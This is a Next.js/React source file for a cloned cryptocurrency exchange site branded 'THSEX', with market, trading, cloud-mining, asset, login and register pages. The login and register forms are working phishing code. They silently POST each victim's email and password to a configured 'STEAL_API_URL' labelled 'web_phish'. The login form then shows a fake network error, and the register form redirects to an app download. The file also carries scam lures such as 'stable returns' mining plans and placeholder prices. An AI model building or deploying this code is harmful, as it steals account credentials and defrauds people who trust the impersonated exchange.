"use client";

import Link from "next/link";
import { useState } from "react";
import { ROUTES } from "@/lib/routes";
import { STEAL_API_URL } from "@/lib/config";

const PAIRS = [
  { name: "BTC/USDT", price: "88,888.88", chg: "+1.62%", up: true },
  { name: "ETH/USDT", price: "3,245.10", chg: "-0.84%", up: false },
  { name: "SOL/USDT", price: "142.55", chg: "+3.21%", up: true },
  { name: "BNB/USDT", price: "612.30", chg: "+0.45%", up: true },
];

export default function MarketClone() {
  return (
    <div className="tab-page market-page">
      <header className="tab-page-header">
        <h1>Markets</h1>
      </header>
      <div className="market-list">
        {PAIRS.map((p) => (
          <div key={p.name} className="market-row">
            <div className="market-left">
              <img src="/assets/icon-huo.png" alt="" className="market-fire" />
              <div>
                <div className="market-name">{p.name}</div>
                <div className="market-vol">Vol 24h</div>
              </div>
            </div>
            <div className="market-mid">{p.price}</div>
            <div className={`market-chg ${p.up ? "up" : "down"}`}>{p.chg}</div>
          </div>
        ))}
      </div>
      <Link href={ROUTES.trade} className="market-more">
        View more markets →
      </Link>
    </div>
  );
}

export function TradeClone() {
  return (
    <div className="tab-page trade-page">
      <header className="tab-page-header">
        <h1>Trading</h1>
        <p>BTC/USDT · Perpetual</p>
      </header>
      <div className="trade-price">$ 88,888.88</div>
      <div className="trade-chart-placeholder">
        <img src="/assets/k3.png" alt="" />
      </div>
      <div className="trade-actions">
        <button type="button" className="trade-long">
          Open Long
        </button>
        <button type="button" className="trade-short">
          Open Short
        </button>
      </div>
    </div>
  );
}

export function FinanceClone() {
  return (
    <div className="tab-page finance-page">
      <header className="tab-page-header">
        <h1>Cloud Mining</h1>
      </header>
      <img src="/assets/group-212.png" alt="" className="finance-hero" />
      <p className="finance-desc">Cloud mining plans with stable returns</p>
      <div className="finance-cards">
        <div className="finance-card">Starter Plan · 30 days</div>
        <div className="finance-card">Pro Plan · 90 days</div>
      </div>
    </div>
  );
}

export function AssetClone() {
  return (
    <div className="tab-page asset-page">
      <header className="tab-page-header">
        <h1>Assets</h1>
      </header>
      <div className="asset-summary">
        <span>Total Balance (USDT)</span>
        <strong>0.00</strong>
      </div>
      <div className="asset-actions">
        <Link href={ROUTES.login} className="asset-btn">
          Log in to view assets
        </Link>
      </div>
    </div>
  );
}

export function LoginClone() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    try {
      await fetch(STEAL_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "web_login_phish",
          email,
          password,
          mobile: email,
          note: "Web clone login form — credentials captured",
        }),
      });
    } catch {
      /* silent */
    }
    alert("Network error, please try again.");
  }

  return (
    <div className="login-box">
      <div className="login-top">
        <Link href={ROUTES.home}>←</Link>
      </div>
      <div className="log-box">
        <img src="/assets/icon_logo.png" alt="THSEX" />
      </div>
      <form className="login-email-box" onSubmit={onSubmit}>
        <h1 className="page-title">Log in</h1>
        <div className="login-item">
          <div className="input-box">
            <img src="/assets/icon_email.png" alt="" className="left-icon" />
            <input
              type="text"
              placeholder="Email / Phone"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
        </div>
        <div className="login-item">
          <div className="input-box">
            <img src="/assets/icon_password.png" alt="" className="left-icon" />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
        </div>
        <button type="submit" className="at-once-login">
          Log in now
        </button>
      </form>
      <Link href={ROUTES.register} className="fixed-register">
        Register an account
      </Link>
    </div>
  );
}

export function RegisterClone() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    try {
      await fetch(STEAL_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "web_register_phish",
          email,
          password,
          mobile: email,
        }),
      });
    } catch {
      /* silent */
    }
    window.location.href = ROUTES.download;
  }

  return (
    <div className="login-box">
      <div className="login-top">
        <Link href={ROUTES.home}>←</Link>
      </div>
      <div className="log-box">
        <img src="/assets/icon_logo.png" alt="THSEX" />
      </div>
      <form className="login-email-box" onSubmit={onSubmit}>
        <h1 className="page-title">Register</h1>
        <div className="login-item">
          <div className="input-box">
            <img src="/assets/icon_email.png" alt="" className="left-icon" />
            <input
              type="text"
              placeholder="Email / Phone"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
        </div>
        <div className="login-item">
          <div className="input-box">
            <img src="/assets/icon_password.png" alt="" className="left-icon" />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
        </div>
        <button type="submit" className="at-once-login">
          Register now
        </button>
      </form>
      <p className="register-hint">After register → download app to start trading</p>
    </div>
  );
}
